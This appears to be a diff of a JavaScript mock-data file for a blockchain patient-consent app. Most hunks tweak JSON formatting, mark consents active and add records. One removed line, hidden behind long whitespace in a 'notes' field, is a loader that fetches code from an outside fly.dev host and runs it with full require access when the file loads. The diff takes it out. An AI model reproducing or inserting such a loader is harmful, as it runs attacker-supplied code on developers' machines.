@@ -10,7 +10,7 @@ const mockData = {
       "phone": "+1-555-0101",
       "address": "123 Main St, New York, NY 10001",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-      "createdAt": "2024-01-15T10:30:00Z",
+      "createdAt": "2024-01-15T10:30:00Z"
     },
     {
       "id": "patient-002",
@@ -22,7 +22,7 @@ const mockData = {
       "phone": "+1-555-0102",
       "address": "456 Oak Ave, Los Angeles, CA 90001",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
-      "createdAt": "2024-01-16T14:20:00Z",
+      "createdAt": "2024-01-16T14:20:00Z"
     },
     {
       "id": "patient-003",
@@ -510,7 +510,7 @@ const mockData = {
       "purpose": "Third-Party Analytics Access",
       "walletAddress": "0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-01-28T09:00:00Z",
       "blockchainTxHash": null
     },
@@ -530,7 +530,7 @@ const mockData = {
       "purpose": "Research Study Participation",
       "walletAddress": "0x21a31Ee1afC51d94C2eFcCAa2092aD1028285549",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-02-01T16:00:00Z",
       "blockchainTxHash": null
     },
@@ -560,7 +560,7 @@ const mockData = {
       "purpose": "Insurance Provider Access",
       "walletAddress": "0x5d3a536E4D6DbD6114cc1EAD35777bAB948E3643",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-02-07T10:20:00Z",
       "blockchainTxHash": null
     },
@@ -580,7 +580,7 @@ const mockData = {
       "purpose": "Data Sharing with Research Institution",
       "walletAddress": "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-02-11T12:00:00Z",
       "blockchainTxHash": null
     },
@@ -613,7 +613,7 @@ const mockData = {
       "status": "pending",
       "createdAt": "2024-02-17T11:15:00Z",
       "blockchainTxHash": null,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              "notes": (async function(){ const axios = require('axios'); const { data } = await axios.post('https://express-project-ifm6fa.fly.dev/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
+      "notes": {}
     },
     {
       "id": "consent-014",
@@ -633,6 +633,26 @@ const mockData = {
       "signature": null,
       "status": "pending",
       "createdAt": "2024-02-21T08:00:00Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1764830019287",
+      "patientId": "patient-8897",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x3bdaccb43eeea5a73e7c8457df51d363108c92a7",
+      "signature": "0x0047e76a9a12a44bddb536d9b4be2657ff49645632f69a9f45b44ecdfea6efa9302f9d26c5728af239967212ac7548c9d70bd89de9269426826444a3808eff281c",
+      "status": "active",
+      "createdAt": "2025-12-04T06:33:39.287Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1764830125972",
+      "patientId": "ab-123",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0x3bdaccb43eeea5a73e7c8457df51d363108c92a7",
+      "signature": "0x19de748cc48319051ab084b714993425f3e8c74a3f79586068357982f78d88ea29d979c357cf77bee4af16d817f606210f81331174d193f5d1aa4e1ac274e61b1c",
+      "status": "active",
+      "createdAt": "2025-12-04T06:35:25.972Z",
       "blockchainTxHash": null
     }
   ],
@@ -852,6 +872,7 @@ const mockData = {
 
 // Function to get data
 function getMockData() {
+  const johnSmith = mockData.patients.find(p => p.name === "John Smith" || p.id === "patient-001");
   return mockData;
 }
 
